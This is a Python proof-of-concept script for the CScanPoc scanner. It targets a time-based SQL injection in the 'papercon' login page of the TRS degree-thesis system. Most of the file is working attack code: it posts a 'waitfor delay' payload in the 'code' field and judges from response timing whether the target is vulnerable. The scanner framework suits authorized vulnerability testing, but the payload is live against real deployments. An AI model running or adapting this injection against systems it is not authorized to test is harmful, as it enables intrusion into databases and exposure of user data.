# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'TRS_0006' # 平台漏洞编号，留空
    name = 'TRS学位论文系统papercon处SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-11'  # 漏洞公布时间
    desc = '''
        TRS学位论文系统papercon处SQL注入
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0124453' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'TRS'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'TRS_0006' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/papercon'
            delay_0 = 'action=login&r_code=%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5&r_password=%C3%DC%C2%EB%B2%BB%C4%DC%CE%AA%BF%D5&code=test%27;waitfor%20delay%270:0:0%27--&password=dsdfaf'
            delay_5 = 'action=login&r_code=%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5&r_password=%C3%DC%C2%EB%B2%BB%C4%DC%CE%AA%BF%D5&code=test%27;waitfor%20delay%270:0:5%27--&password=dsdfaf'
            code, head, res, err, _ = hh.http(arg + 'papercon')  #这句好像并没有什么用，然而加上这句能提高准确率
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            t1 = time.time()
            code, head, res, err, _ = hh.http(url, post=delay_0, header=content_type)
            #print code, head
            if code >= 400:
                return False
            t2 = time.time()
            code, head, res, err, _ = hh.http(url, post=delay_5, header=content_type)
            if code >= 400:
                return False
            t3 = time.time()
            #debug("t0:" + str(t2-t1) + " t5:" + str(t3-t2))
            if(t1 + t3 - 2*t2) > 3:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()